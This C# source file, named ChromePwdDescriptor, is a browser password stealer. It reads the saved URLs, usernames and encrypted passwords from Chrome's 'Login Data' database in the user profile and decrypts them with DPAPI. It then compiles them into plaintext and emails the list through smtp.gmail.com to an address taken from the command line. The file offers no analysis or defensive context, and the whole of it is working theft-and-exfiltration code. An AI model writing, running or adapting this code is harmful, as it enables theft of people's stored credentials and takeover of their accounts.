using System;
using System.Data;
using System.Data.SQLite;
using System.Text;

namespace ChromePwdDescriptor
{
	class Program
	{
		static void Main(string[] args)
		{
			string sendTo = args.Length > 0 ? args[0] : "";

			DataTable DT = new DataTable();

			const string sql = "SELECT `origin_url`, `username_value`, `password_value` FROM `logins`";
			string dbPath = "Data Source=" + (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data");
			string result = String.Empty;

			using (SQLiteConnection conn = new SQLiteConnection(dbPath))
			{
				SQLiteCommand cmd = new SQLiteCommand(sql, conn);
				SQLiteDataAdapter adapter = new SQLiteDataAdapter(cmd);

				adapter.Fill(DT);

				byte[] passBytes, descryptedPass;
				string login, password, url;

				for (int i = 0; i < DT.Rows.Count; i++)
				{
					passBytes = (byte[])DT.Rows[i][2];
					descryptedPass = DPAPI.Decrypt(passBytes, null, out string _);

					password = new UTF8Encoding(true).GetString(descryptedPass);

					if (password.Length > 0)
					{
						login = (string)DT.Rows[i][1];

						if (login.Length > 0)
						{
							url = (string)DT.Rows[i][0];

							result += String.Format("URL = [{0}]\nLOGIN = [{1}]\nPASSWORD = [{2}]\n\n", url, login, password);
						}
					}
				}
			}

			Mailer mailer = new Mailer("smtp.gmail.com", 587, "", "");
			mailer.SendMail(sendTo, result);
		}
	}
}
